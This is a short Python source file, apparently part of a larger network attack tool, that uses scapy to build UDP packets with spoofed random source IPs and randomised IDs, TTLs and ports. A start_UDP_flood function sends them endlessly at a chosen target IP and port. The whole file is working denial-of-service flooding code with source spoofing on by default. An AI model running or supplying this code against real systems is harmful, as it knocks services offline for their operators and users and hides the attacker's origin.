from scapy.all import IP, UDP, send, RandIP, RandShort
from sys import path
path.append("..")
import packet_builder

def build_UDP_packet(destination_IP, destination_port, IP_spoofing=True):
    """Generate UDP packet with random source port.

    Arguments: 
    destination_IP -- the IP address of the target
    destination_port -- the targets port to which the packet will be sent
    IP_spoofing -- enable or disable source IP spoofing (default True)

    """
    if IP_spoofing:
        return IP(src=RandIP(), dst=destination_IP, id=RandShort(), ttl=packet_builder.generate_ttl())/UDP(sport=RandShort(), dport=destination_port)/packet_builder.generate_payload()

    return IP(dst=destination_IP, id=RandShort(), ttl=packet_builder.generate_ttl())/UDP(sport=RandShort(), dport=destination_port)/packet_builder.generate_payload()

def start_UDP_flood(destination_IP, destination_port, IP_spoofing):
    """Continuously send UDP packets"""
    try:
        while True:
            send(build_UDP_packet(destination_IP, destination_port, IP_spoofing), inter=packet_builder.generate_delay_for_packet())   
    except KeyboardInterrupt:
        print("...Exiting...")
